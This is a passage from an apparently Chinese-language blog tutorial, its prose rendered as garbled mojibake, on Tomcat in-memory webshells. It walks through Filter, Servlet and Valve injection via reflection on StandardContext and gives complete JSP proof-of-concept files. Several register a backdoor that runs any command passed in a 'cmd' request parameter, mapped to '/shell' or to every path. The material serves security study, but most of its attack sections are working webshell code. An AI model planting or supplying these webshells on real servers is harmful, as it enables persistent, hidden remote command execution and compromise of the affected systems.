<pre><code class="language-java">Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(context);
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
filterConfigs.put(name, filterConfig);
</code></pre>
<h3 id="poc">POC</h3>
<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%!
    public class CmdFilter implements Filter {

        @Override
        public void init(FilterConfig filterConfig)  {
            System.out.println(&quot;shell&quot;);
        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException, IOException {
            Runtime.getRuntime().exec(&quot;calc&quot;);
            chain.doFilter(request,response);
        }

        @Override
        public void destroy() {
        }
    }
%&gt;



&lt;%
    //è·å–ApplicationContextFacadeç±»
    ServletContext servletContext = request.getSession().getServletContext();

//åå°„è·å–ApplicationContextFacadeç±»å±æ€§contextä¸ºApplicationContextç±»
    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

//åå°„è·å–ApplicationContextç±»å±æ€§contextä¸ºStandardContextç±»
    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
    standardContextField.setAccessible(true);
    StandardContext context = (StandardContext) standardContextField.get(applicationContext);
%&gt;

&lt;%
    String name=&quot;filtershell&quot;;
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(new CmdFilter());
    filterDef.setFilterClass(CmdFilter.class.getName());
    filterDef.setFilterName(name);
    context.addFilterDef(filterDef);
%&gt;

&lt;%
    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    filterMap.addURLPattern(&quot;/*&quot;);
    context.addFilterMap(filterMap);
%&gt;


&lt;%
    Field Configs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(context);

    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);
    filterConfigs.put(name, filterConfig);
%&gt;
</code></pre>
<p>è¿˜æ˜¯ä¸€æ · å¾—å…ˆè®¿é—®jspæœ¨é©¬æ–‡ä»¶ï¼Œç„¶åå°±ä¼šè‡ªåŠ¨æ³¨å…¥è¿›å»ï¼Œæ³¨å…¥å®Œæ¯•ä¹‹ååœ¨æˆ‘ä»¬è®¿é—®èµ„æºä¹‹å‰å°±ä¼šè¿›è¡Œæ‹¦æˆªæ‰§è¡Œå‘½ä»¤</p>
<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1752213967018.png" alt="" loading="lazy"></figure>
<h2 id="servletå‹">Servletå‹</h2>
<p>å…¶å®æ€è·¯éƒ½å·®ä¸å¤šï¼Œå°±æ˜¯çœ‹æ€ä¹ˆæŠŠæ¶æ„ç±»æ³¨å…¥åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼Œæ¯ä¸€ç§ç±»å‹æ¶‰åŠçš„æ–¹æ³•ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ³¨å…¥æ—¶è°ƒç”¨çš„æ–¹æ³•ä¹Ÿä¸ä¸€æ ·</p>
<h3 id="ç¼–å†™æ¶æ„servlet">ç¼–å†™æ¶æ„servlet</h3>
<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%!
    //jspå®šä¹‰æˆ–è€…å£°æ˜éœ€è¦åŠ ä¸Šï¼
    public class CmdServlet extends HttpServlet {
        @Override
        public void init(ServletConfig servletConfig){

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            if(cmd!=null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%&gt;
</code></pre>
<h3 id="æ³¨å…¥servletå†…å­˜é©¬">æ³¨å…¥servletå†…å­˜é©¬</h3>
<p>è¿™é‡Œå°±åªçœ‹ConfigContext#configureContextæ³¨å†ŒServletæµç¨‹è¿‡ç¨‹äº†ï¼Œå› ä¸ºæŒ‰ç…§é¡ºåºæ¥è¯´æ˜¯å…ˆlistener-filter-servlet</p>
<p>å…ˆå†™å‡ºå¤§è‡´æ­¥éª¤</p>
<pre><code class="language-java">ç”±ä¸Šä¸‹æ–‡contextåˆ›å»ºwrapperï¼Œç”¨æ¥åŒ…è£…servlet
è®¾ç½®Servletåç§°
è®¾ç½®Servletå…¨ç±»å
wrapoerè®¾ç½®servlet
å°†wrapperæ”¾å…¥context
æ·»åŠ urlè·¯å¾„æ˜ å°„
</code></pre>
<h4 id="åˆ›å»ºstandardwrapper">åˆ›å»ºStandardWrapper</h4>
<p>åœ¨<code>StandardContext</code>#<code>startInternal</code>ä¸­ï¼Œè°ƒç”¨äº†<code>fireLifecycleEvent()</code>æ–¹æ³•è§£æweb.xmlæ–‡ä»¶</p>
<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1752213967033.png" alt="" loading="lazy"></figure>
<p>çœ‹çœ‹fireLifecycleEvent()æ–¹æ³•çš„å…·ä½“å®ç°ï¼š</p>
<pre><code class="language-java">protected void fireLifecycleEvent(String type, Object data) {
    LifecycleEvent event = new LifecycleEvent(this, type, data);
    Iterator i$ = this.lifecycleListeners.iterator();

    while(i$.hasNext()) {
        LifecycleListener listener = (LifecycleListener)i$.next();
        listener.lifecycleEvent(event);
    }

}
</code></pre>
<p>æœ€ç»ˆé€šè¿‡ContextConfig#webConfig()æ–¹æ³•è§£æweb.xmlè·å–å„ç§é…ç½®å‚æ•°,é‡Œé¢é€šè¿‡è°ƒç”¨configureContextæ–¹æ³•æ¥ä»contexté‡Œé¢è·å–web.xmlé‡Œé¢çš„ä¿¡æ¯</p>
<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1752213967049.png" alt="" loading="lazy"></figure>
<p>è·å–åˆ°ä¿¡æ¯ä¹‹åï¼Œæ˜¯é€šè¿‡ContextConfig#addServletContainerInitializeræ¥æ·»åŠ </p>
<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1752213967065.png" alt="" loading="lazy"></figure>
<p>é€šè¿‡<code>configureContext(webXml)</code>æ–¹æ³•åˆ›å»ºStandWrapperå¯¹è±¡ï¼Œå¹¶æ ¹æ®è§£æå‚æ•°åˆå§‹åŒ–StandWrapperå¯¹è±¡</p>
<pre><code class="language-java"> private void configureContext(WebXml webxml) {
        // As far as possible, process in alphabetical order so it is easy to
        // check everything is present
        // Some validation depends on correct public ID
        context.setPublicId(webxml.getPublicId());
 
...   //è®¾ç½®StandardContextå‚æ•°
 
        
        for (ServletDef servlet : webxml.getServlets().values()) {
 
            //åˆ›å»ºStandardWrapperå¯¹è±¡
            Wrapper wrapper = context.createWrapper();
 
            if (servlet.getLoadOnStartup() != null) {
 
                //è®¾ç½®LoadOnStartupå±æ€§
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
 
            //è®¾ç½®ServletNameå±æ€§
            wrapper.setName(servlet.getServletName());
            Map&lt;String,String&gt; params = servlet.getParameterMap();
            for (Entry&lt;String, String&gt; entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
 
            //è®¾ç½®ServletClasså±æ€§
            wrapper.setServletClass(servlet.getServletClass());
            ...
            wrapper.setOverridable(servlet.isOverridable());
 
            //å°†åŒ…è£…å¥½çš„StandWrapperæ·»åŠ è¿›ContainerBaseçš„childrenå±æ€§ä¸­
            context.addChild(wrapper);
 
           for (Entry&lt;String, String&gt; entry :
                webxml.getServletMappings().entrySet()) {
          
            //æ·»åŠ è·¯å¾„æ˜ å°„
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
        }
        ...
    }
</code></pre>
<p>æœ€åé€šè¿‡<code>addServletMappingDecoded()</code>æ–¹æ³•æ·»åŠ Servletå¯¹åº”çš„urlæ˜ å°„</p>
<h4 id="åŠ è½½standwrapper">åŠ è½½StandWrapper</h4>
<p>åœ¨<code>StandardContext#startInternal</code>æ–¹æ³•é€šè¿‡<code>findChildren()</code>è·å–<code>StandardWrapper</code>ç±»</p>
<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1752213967080.png" alt="" loading="lazy"></figure>
<p>æœ€åä¾æ¬¡åŠ è½½å®ŒListenerã€Filteråï¼Œå°±é€šè¿‡<code>loadOnStartUp()</code>æ–¹æ³•åŠ è½½wrapper</p>
<pre><code class="language-java">    public boolean loadOnStartup(Container children[]) {
 
        // Collect &quot;load on startup&quot; servlets that need to be initialized
        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();
        for (Container child : children) {
            Wrapper wrapper = (Wrapper) child;
            int loadOnStartup = wrapper.getLoadOnStartup();
 
            //åˆ¤æ–­å±æ€§loadOnStartupçš„å€¼
            if (loadOnStartup &lt; 0) {
                continue;
            }
            Integer key = Integer.valueOf(loadOnStartup);
            ArrayList&lt;Wrapper&gt; list = map.get(key);
            if (list == null) {
                list = new ArrayList&lt;&gt;();
                map.put(key, list);
            }
            list.add(wrapper);
        }
 
        // Load the collected &quot;load on startup&quot; servlets
        for (ArrayList&lt;Wrapper&gt; list : map.values()) {
            for (Wrapper wrapper : list) {
                try {
                    wrapper.load();
                }
</code></pre>
<p>æ³¨æ„è¿™é‡Œå¯¹äºWrapperå¯¹è±¡ä¸­<code>loadOnStartup</code>å±æ€§çš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰å¤§äº0çš„æ‰ä¼šè¢«æ”¾å…¥listè¿›è¡Œåç»­çš„<code>wrapper.load()</code>åŠ è½½è°ƒç”¨ã€‚</p>
<p>è¿™é‡Œå¯¹åº”çš„å®é™…ä¸Šå°±æ˜¯Tomcat Servletçš„æ‡’åŠ è½½æœºåˆ¶ï¼Œå¯ä»¥é€šè¿‡<code>loadOnStartup</code>å±æ€§å€¼æ¥è®¾ç½®æ¯ä¸ªServletçš„å¯åŠ¨é¡ºåºã€‚é»˜è®¤å€¼ä¸º-1ï¼Œæ‰€ä»¥æ˜¯éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹çš„</p>
<p>æ€»ç»“ä¸€ä¸‹éœ€è¦å®Œæˆå“ªäº›ï¼š</p>
<pre><code class="language-java">è·å–StandardContextå¯¹è±¡
ç¼–å†™æ¶æ„Servlet
é€šè¿‡StandardContext.createWrapper()åˆ›å»ºStandardWrapperå¯¹è±¡
è®¾ç½®StandardWrapperå¯¹è±¡çš„loadOnStartupå±æ€§å€¼
è®¾ç½®StandardWrapperå¯¹è±¡çš„ServletNameå±æ€§å€¼
è®¾ç½®StandardWrapperå¯¹è±¡çš„ServletClasså±æ€§å€¼
å°†StandardWrapperå¯¹è±¡æ·»åŠ è¿›StandardContextå¯¹è±¡çš„childrenå±æ€§ä¸­
é€šè¿‡StandardContext.addServletMappingDecoded()æ·»åŠ å¯¹åº”çš„è·¯å¾„æ˜ å°„
</code></pre>
<p>è·å–StandardContextå¯¹è±¡ï¼š</p>
<pre><code class="language-java">&lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%&gt;
</code></pre>
<p>æ¶æ„ç±»ï¼š</p>
<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%!
    //jspå®šä¹‰æˆ–è€…å£°æ˜éœ€è¦åŠ ä¸Šï¼
    public class CmdServlet extends HttpServlet {
        @Override
        public void init(ServletConfig servletConfig){

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            if(cmd!=null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%&gt;
</code></pre>
<p>åˆ›å»ºStandardWrapperå¯¹è±¡</p>
<pre><code class="language-java">&lt;%
    CmdServlet cmdServlet = new CmdServlet();
    String name = cmdServlet.getClass().getSimpleName();
 
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(cmdServlet);
    wrapper.setServletClass(cmdServlet.getClass().getName());
%&gt;
</code></pre>
<p>æ·»åŠ è¿›ä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="language-java">&lt;%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
%&gt;
</code></pre>
<h3 id="poc-2">POC</h3>
<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
&lt;%!
    //jspå®šä¹‰æˆ–è€…å£°æ˜éœ€è¦åŠ ä¸Šï¼
    public class CmdServlet extends HttpServlet {
        @Override
        public void init(ServletConfig servletConfig){

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            if(cmd!=null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%&gt;

&lt;%
    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%&gt;

&lt;%
    CmdServlet cmdServlet = new CmdServlet();
    String name = cmdServlet.getClass().getSimpleName();

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(cmdServlet);
    wrapper.setServletClass(cmdServlet.getClass().getName());
%&gt;

&lt;%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);
%&gt;
</code></pre>
<p>å¾—å…ˆè®¿é—®jspæ–‡ä»¶ åŠ è½½è¿›å»ä¹‹ååœ¨å¯¹åº”çš„è·¯å¾„ä¸‹æ‰§è¡Œå‘½ä»¤</p>
<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1752213967096.png" alt="" loading="lazy"></figure>
<h2 id="valveå‹">Valveå‹</h2>
<p>å…ˆå­¦ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯Valve</p>
<p>æˆ‘ä»¬å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹Tomcatä¸­çš„<code>ç®¡é“æœºåˆ¶</code></p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“Tomcatæ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šä½¿ç”¨<code>Connector</code>è¿›è¡Œè§£æï¼Œç„¶åå‘é€åˆ°<code>Container</code>è¿›è¡Œå¤„ç†ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ¶ˆæ¯åˆæ˜¯æ€ä¹ˆåœ¨å››ç±»å­å®¹å™¨ä¸­å±‚å±‚ä¼ é€’ï¼Œæœ€ç»ˆé€åˆ°Servletè¿›è¡Œå¤„ç†çš„å‘¢ï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°çš„æœºåˆ¶å°±æ˜¯Tomcatç®¡é“æœºåˆ¶ã€‚</p>
<p>ç®¡é“æœºåˆ¶ä¸»è¦æ¶‰åŠåˆ°ä¸¤ä¸ªåè¯ï¼ŒPipelineï¼ˆç®¡é“ï¼‰å’ŒValveï¼ˆé˜€é—¨ï¼‰ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¯·æ±‚æ¯”ä½œç®¡é“ï¼ˆPipelineï¼‰ä¸­æµåŠ¨çš„æ°´ï¼Œé‚£ä¹ˆé˜€é—¨ï¼ˆValveï¼‰å°±å¯ä»¥ç”¨æ¥åœ¨ç®¡é“ä¸­å®ç°å„ç§åŠŸèƒ½ï¼Œå¦‚æ§åˆ¶æµé€Ÿç­‰ã€‚å› æ­¤é€šè¿‡ç®¡é“æœºåˆ¶ï¼Œæˆ‘ä»¬èƒ½æŒ‰ç…§éœ€æ±‚ï¼Œç»™åœ¨ä¸åŒå­å®¹å™¨ä¸­æµé€šçš„è¯·æ±‚æ·»åŠ å„ç§ä¸åŒçš„ä¸šåŠ¡é€»è¾‘ï¼Œå¹¶æå‰åœ¨ä¸åŒå­å®¹å™¨ä¸­å®Œæˆç›¸åº”çš„é€»è¾‘æ“ä½œã€‚è¿™é‡Œçš„è°ƒç”¨æµç¨‹å¯ä»¥ç±»æ¯”ä¸ºFilterä¸­çš„è´£ä»»é“¾æœºåˆ¶</p>
<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1752213967112.png" alt="" loading="lazy"></figure>
<p>åœ¨Tomcatä¸­ï¼Œå››å¤§ç»„ä»¶Engineã€Hostã€Contextä»¥åŠWrapperéƒ½æœ‰å…¶å¯¹åº”çš„Valveç±»ï¼ŒStandardEngineValveã€StandardHostValveã€StandardContextValveä»¥åŠStandardWrapperValveï¼Œä»–ä»¬åŒæ—¶ç»´æŠ¤ä¸€ä¸ª<strong>StandardPipeline</strong>å®ä¾‹ã€‚</p>
<h3 id="ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ">ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ</h3>
<p>Pipelineæ¥å£ï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ˜¯ç»§æ‰¿äº†Contained</p>
<pre><code class="language-java">public interface Pipeline extends Contained {
 
    public Valve getBasic();
 
    public void setBasic(Valve valve);
 
    public void addValve(Valve valve);
 
    public Valve[] getValves();
 
    public void removeValve(Valve valve);
 
    public void findNonAsyncValves(Set&lt;String&gt; result);
}
</code></pre>
<p>Pipelineæ¥å£æä¾›äº†å„ç§å„æ ·å¯¹Valueæ“ä½œçš„æ¥å£ï¼Œä¾‹å¦‚æˆ‘ä»¬ç­‰ä¼šéœ€è¦ç”¨çš„çš„addValue</p>
<p>Valueæ¥å£ï¼š</p>
<pre><code class="language-java">public interface Valve {
 
    public Valve getNext();
 
    public void setNext(Valve valve);
 
    public void backgroundProcess();
 
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
 
    public boolean isAsyncSupported();
}
</code></pre>
<p>å…¶ä¸­getNext()æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¸‹ä¸€ä¸ªValveï¼Œè¿™ä¸ªè°ƒç”¨æ¨¡å¼è·ŸFilterçš„è°ƒç”¨æ¨¡å¼å¾ˆåƒ</p>
<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1752213967129.jpeg" alt="" loading="lazy"></figure>
<p>é€šè¿‡æºç çœ‹ä¸€çœ‹ï¼Œæ¶ˆæ¯åœ¨å®¹å™¨ä¹‹é—´æ˜¯å¦‚ä½•ä¼ é€’çš„</p>
<p>æ¶ˆæ¯ä¼ é€’åˆ°Connectorè¢«è§£æåï¼Œåœ¨<code>org.apache.catalina.connector.CoyoteAdapter#service</code>æ–¹æ³•ä¸­ï¼š</p>
<pre><code class="language-java">public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
    Request request = (Request) req.getNote(ADAPTER_NOTES);
    Response response = (Response) res.getNote(ADAPTER_NOTES);

    if (request == null) {
        // Create objects
        request = connector.createRequest();
        request.setCoyoteRequest(req);
        response = connector.createResponse();
        response.setCoyoteResponse(res);

        // Link objects
        request.setResponse(response);
        response.setRequest(request);

        // Set as notes
        req.setNote(ADAPTER_NOTES, request);
        res.setNote(ADAPTER_NOTES, response);

        // Set query string encoding
        req.getParameters().setQueryStringCharset(connector.getURICharset());
    }
        ...

    try {
        ...
        connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);
    }
        ...
}
</code></pre>
<p>ä¸»è¦çš„å°±æ˜¯çœ‹è¿™ä¸ª<strong>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</strong></p>
<p>æˆ‘ä»¬è¿™é‡Œæœ€å¥½æ˜¯é€šè¿‡æ–­ç‚¹æ¥çœ‹ï¼Œçœ‹çš„æ›´æ¸…æ¥š</p>
<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1752213967145.png" alt="" loading="lazy"></figure>
<p>connector.getService()ï¼š è·å¾—StandardService<br>
<img src="https://bloyet.github.io/post-images/1752213967159.png" alt="" loading="lazy"></p>
<p>æ¥ç€é€šè¿‡StandardService.getContainer().getPipeline()è·å–StandardPipelineå¯¹è±¡</p>
<figure data-type="image" tabindex="32"><img src="https://bloyet.github.io/post-images/1752213967175.png" alt="" loading="lazy"></figure>
<p>connector.getService().getContainer().getPipeline().getFirst() è·å–åˆ°Valve</p>
<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1752213967191.png" alt="" loading="lazy"></figure>
<p>ç„¶åå°±æ˜¯é€šè¿‡invokeæ–¹æ³• æ¥æ‰§è¡Œä¸åŒçš„æ–¹æ³•äº†</p>
<h3 id="æ³¨å…¥valve">æ³¨å…¥Valve</h3>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡getFirst()æ¥è·å–åˆ°ä¸åŒçš„Valve ç„¶ååœ¨æ‰§è¡Œå¯¹åº”çš„æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åªéœ€è¦è·å–åˆ°ç½‘é¡µçš„contextï¼Œç„¶åæŠŠæˆ‘ä»¬æ¶æ„çš„Valueå­˜æ”¾è¿›å»ï¼Œå°±å¯ä»¥è¾¾åˆ°æ”»å‡»ç›®çš„äº†</p>
<p>æˆ‘ä»¬çœ‹çœ‹åœ¨å“ªé‡Œå­˜æ”¾äº†Valve ï¼Œæ‰¾åˆ°Pipeline</p>
<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1752213967239.png" alt="" loading="lazy"></figure>
<p>pipelineæ˜¯åœ¨å®ƒçš„çˆ¶ç±»ä¸­å®šä¹‰çš„</p>
<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1752213967207.png" alt="" loading="lazy"></figure>
<p>æ¥ç€çœ‹</p>
<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1752213967223.png" alt="" loading="lazy"></figure>
<p>å¯ä»¥é€šè¿‡addValveæ–¹æ³•æ·»åŠ Valve</p>
<p>é‚£ä¹ˆç°åœ¨æ€è·¯å°±æ˜ç¡®äº†ï¼š</p>
<ol>
<li>è·å–<code>StandardContext</code>å¯¹è±¡</li>
<li>é€šè¿‡<code>StandardContext</code>å¯¹è±¡è·å–<code>StandardPipeline</code></li>
<li>ç¼–å†™æ¶æ„Valve</li>
<li>é€šè¿‡<code>StandardPipeline.addValve()</code>åŠ¨æ€æ·»åŠ Valve</li>
</ol>
<p>è·å–StandardPipelineå¯¹è±¡</p>
<pre><code class="language-java">&lt;%
Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext standardContext = (StandardContext) req.getContext();

Pipeline pipeline = standardContext.getPipeline();
%&gt;
</code></pre>
<p>ç¼–å†™æ¶æ„Valve</p>
<p>ç»§æ‰¿çˆ¶ç±»ï¼Œå¹¶ä¸”é‡å†™invokeæ–¹æ³•</p>
<pre><code class="language-java">&lt;%!
class Shell_Valve extends ValveBase {

@Override
public void invoke(Request request, Response response) throws IOException, ServletException {
    String cmd = request.getParameter(&quot;cmd&quot;);
    if (cmd !=null){
        try{
            Runtime.getRuntime().exec(cmd);
        }catch (IOException e){
            e.printStackTrace();
        }catch (NullPointerException n){
            n.printStackTrace();
        }
    }
}
}
%&gt;
</code></pre>
<p>åŠ¨æ€æ·»åŠ Valve</p>
<pre><code class="language-java">&lt;%
Shell_Valve shell_valve = new Shell_Valve();
pipeline.addValve(shell_valve);
%&gt;
</code></pre>
<h3 id="poc-3">POC</h3>
<pre><code class="language-java">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;

&lt;%
Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext standardContext = (StandardContext) req.getContext();

Pipeline pipeline = standardContext.getPipeline();
%&gt;

&lt;%!
class Shell_Valve extends ValveBase {

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        String cmd = request.getParameter(&quot;cmd&quot;);
        if (cmd !=null){
            try{
                Runtime.getRuntime().exec(cmd);
            }catch (IOException e){
                e.printStackTrace();
            }catch (NullPointerException n){
                n.printStackTrace();
            }
        }
    }
}
%&gt;

&lt;%
Shell_Valve shell_valve = new Shell_Valve();
pipeline.addValve(shell_valve);
%&gt;
</code></pre>
<p>è®¿é—®jspæ–‡ä»¶å åŠ¨æ€æ³¨å…¥å†…å­˜é©¬ ä»»æ„è·¯å¾„å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1752213967255.png" alt="" loading="lazy"></figure>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>å…¶å®Tomcatå†…å­˜é©¬å­¦èµ·æ¥ä¹Ÿä¸ç®—å¤ªéš¾ï¼Œåˆ«ç»™è‡ªå·±è®¾ç½®éš¾åº¦ï¼ˆè¿™é‡Œæ˜¯å› ä¸ºä½œè€…çš„å¼€å‘åŠŸåº•ä¸å¤ªå¥½ï¼Œå¾ˆå¤šåŸºç¡€çš„ä¸œè¥¿å¹¶æ²¡æœ‰å»å­¦è¿‡ï¼Œæ‰€ä»¥ä¸€ç›´åœ¨æ‹–å»¶å§ï¼Œå¾—å¥½å¥½åæ€ï¼‰ï¼Œjavaçš„å­¦ä¹ æ˜¯éœ€è¦æ²‰ä¸‹å¿ƒæ¥å­¦ä¹ çš„ åŠ æ²¹</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#tomcat%E4%B8%AD%E7%9A%84%E4%B8%89%E7%A7%8Dcontext">Tomcatä¸­çš„ä¸‰ç§Context</a>
<ul>
<li><a href="#servletcontext">ServletContext</a></li>
<li><a href="#applicationcontext">ApplicationContext</a></li>
<li><a href="#standardcontext">StandardContext</a></li>
</ul>
</li>
<li><a href="#tomcat%E5%86%85%E5%AD%98%E9%A9%AC">Tomcatå†…å­˜é©¬</a>
<ul>
<li><a href="#listener%E5%9E%8B">Listenerå‹</a>
<ul>
<li><a href="#listener%E6%B3%A8%E5%86%8C%E8%BF%87%E7%A8%8B">Listeneræ³¨å†Œè¿‡ç¨‹</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5listener">æ³¨å…¥Listener</a></li>
</ul>
</li>
<li><a href="#filter%E5%9E%8B">Filterå‹</a>
<ul>
<li><a href="#filter%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90">Filterè°ƒç”¨åˆ†æ</a></li>
